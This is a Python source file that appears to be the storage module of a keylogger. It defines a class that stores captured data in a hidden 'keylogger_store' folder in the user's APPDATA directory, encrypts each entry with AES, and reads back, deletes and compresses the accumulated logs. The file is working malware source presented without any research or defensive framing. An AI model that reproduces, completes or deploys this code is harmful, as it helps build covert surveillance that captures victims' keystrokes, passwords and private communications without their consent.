import os
import json
import time
import shutil
import glob
import gzip

import config
from crypto_utils import encrypt as aes_encrypt, decrypt as aes_decrypt
from log_utils import log

_STORAGE_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "keylogger_store")

class SecureStore:
    def __init__(self, base_dir=None):
        self._dir = base_dir or _STORAGE_DIR
        self._key = config.ENCRYPTION_KEY if config.ENCRYPT_LOGS else ""
        try:
            os.makedirs(self._dir, exist_ok=True)
        except Exception:
            pass

    def _file_path(self, tag):
        return os.path.join(self._dir, f"{tag}.log")

    def append(self, tag, data):
        if not data:
            return
        try:
            entry = json.dumps({"ts": time.time(), "data": data})
            encrypted = aes_encrypt(entry, self._key)
            path = self._file_path(tag)
            with open(path, "a") as f:
                f.write(encrypted + "\n")
            self._auto_rotate(tag)
        except Exception as e:
            log("debug", f"Storage append ({tag}) failed: {e}")

    def read_pending(self, tag):
        try:
            path = self._file_path(tag)
            if not os.path.isfile(path):
                return []
            results = []
            with open(path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        dec = aes_decrypt(line, self._key)
                        entry = json.loads(dec)
                        results.append(entry.get("data", ""))
                    except Exception:
                        pass
            return results
        except Exception as e:
            log("debug", f"Storage read ({tag}) failed: {e}")
            return []

    def read_all_tags(self):
        result = {}
        try:
            for fpath in glob.glob(os.path.join(self._dir, "*.log")):
                tag = os.path.splitext(os.path.basename(fpath))[0]
                entries = self.read_pending(tag)
                if entries:
                    result[tag] = entries
        except Exception as e:
            log("debug", f"Storage read_all failed: {e}")
        return result

    def flush(self, tag):
        try:
            path = self._file_path(tag)
            if os.path.isfile(path):
                os.remove(path)
        except Exception as e:
            log("debug", f"Storage flush ({tag}) failed: {e}")

    def flush_all(self):
        try:
            for tag in self._get_tags():
                self.flush(tag)
        except Exception as e:
            log("debug", f"Storage flush_all failed: {e}")

    def _get_tags(self):
        tags = []
        try:
            for fpath in glob.glob(os.path.join(self._dir, "*.log")):
                tags.append(os.path.splitext(os.path.basename(fpath))[0])
        except Exception:
            pass
        return tags

    def _auto_rotate(self, tag):
        try:
            if not config.LOG_RETENTION:
                return
            path = self._file_path(tag)
            if not os.path.isfile(path):
                return
            size = os.path.getsize(path)
            if size < config.LOG_MAX_SIZE:
                return
            dirname = os.path.dirname(path)
            basename = os.path.join(dirname, tag)
            for i in range(config.LOG_ARCHIVE_COUNT - 1, 0, -1):
                src = f"{basename}.{i}.gz"
                dst = f"{basename}.{i + 1}.gz"
                if os.path.isfile(src):
                    shutil.move(src, dst)
            archive_name = f"{basename}.1.gz"
            with open(path, "rb") as raw:
                with gzip.open(archive_name, "wb") as gz:
                    gz.writelines(raw)
            with open(path, "w") as f:
                f.truncate(0)
        except Exception as e:
            log("debug", f"Storage rotate ({tag}) failed: {e}")
